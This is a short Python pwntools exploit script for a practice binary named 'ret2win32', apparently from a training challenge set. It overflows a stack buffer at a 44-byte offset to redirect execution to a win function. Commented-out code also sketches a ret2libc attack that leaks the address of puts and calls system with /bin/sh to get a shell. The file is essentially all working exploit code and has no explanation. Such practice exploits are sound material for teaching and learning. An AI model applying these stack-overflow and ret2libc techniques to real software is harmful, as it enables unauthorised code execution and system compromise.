from pwn import *

elf = ELF("./ret2win32", checksec=False)
p = elf.process()

eip_offset = 44
'''
p.sendline(cyclic(128))
p.wait()
eip_offset = cyclic_find(p.corefile.eip)
p = elf.process()							# reinitializing the process
'''

payload = "A" * eip_offset + p32(elf.symbols['ret2win'])

log.info('Payload length: %d', len(payload))
log.info('Sending payload...')
p.sendlineafter("> ", payload)
log.info('Payload sent!')

p.wait()
success(p.recv())


# ++ Trying to get a shell ++

# gdb_system = 0xf7dfe040
# gdb_puts = 0xf7e29460
# gdb_binsh = 0xf7f45338
# offset_diff1 = gdb_puts - gdb_system
# offset_diff2 = gdb_binsh - gdb_puts

''' First write '''
# payload = "A" * eip_offset + p32(elf.plt['puts']) + p32(elf.entry) + p32(elf.got['puts'])
# print p.recv()
# p.sendline(payload)

# p.recvuntil("you!\n")
# leak = u32(p.recv(4))
# print hex(leak)
# # print hex(offset_diff2 + leak)
# # ''' Second write '''
# # binsh = offset_diff2 + leak
# # payload = "A" * eip_offset + p32(elf.plt['system']) + "BBBB" + p32(0xf7f45338)

# print p.recvuntil("> ")
# p.sendline(payload)
# p.sendlineafter("> ", payload)

# print "puts_libc-addr: ", hex(leak)
# p.interactive()

# print hex(elf.plt['system'])
# print hex(elf.got['system'])
